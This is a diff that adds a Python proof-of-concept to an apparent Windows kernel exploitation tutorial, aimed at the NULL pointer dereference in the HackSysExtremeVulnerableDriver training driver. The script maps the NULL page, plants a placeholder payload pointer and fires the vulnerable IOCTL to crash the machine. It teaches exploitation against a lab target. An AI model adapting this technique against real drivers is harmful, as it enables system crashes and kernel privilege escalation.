@@ -130,6 +130,34 @@ Before we get into the shellcode management section, let's conduct some crash an
 
 This BSOD POC will allocate the NULL memory page, and write a 4-byte shellcode payload (41414141) to our specified memory location.
 
+```python
+import ctypes, sys, struct
+from ctypes import *
+from subprocess import *
+ 
+def main():
+    kernel32 = windll.kernel32
+    psapi = windll.Psapi
+    ntdll = windll.ntdll
+    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
+    
+    shellcode = id("\x41" * 4) + 20
+ 
+    ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
+ 
+    kernel32.WriteProcessMemory(0xFFFFFFFF, 0x00000004, shellcode, 0x40, byref(c_ulong()))
+
+    buf = '\x90\x90\x90\x90'
+    bufLength = len(buf)
+ 
+    kernel32.DeviceIoControl(hevDevice, 0x22202b, buf, bufLength, None, 0, byref(c_ulong()), None)
+ 
+if __name__ == "__main__":
+    main()
+```
+
+
+
 **Before memory allocation**
 
 Before you allocate the payload, you can break the running process (debuggee) and use the command `dd 0x00000004` to view the memory at that specific location.
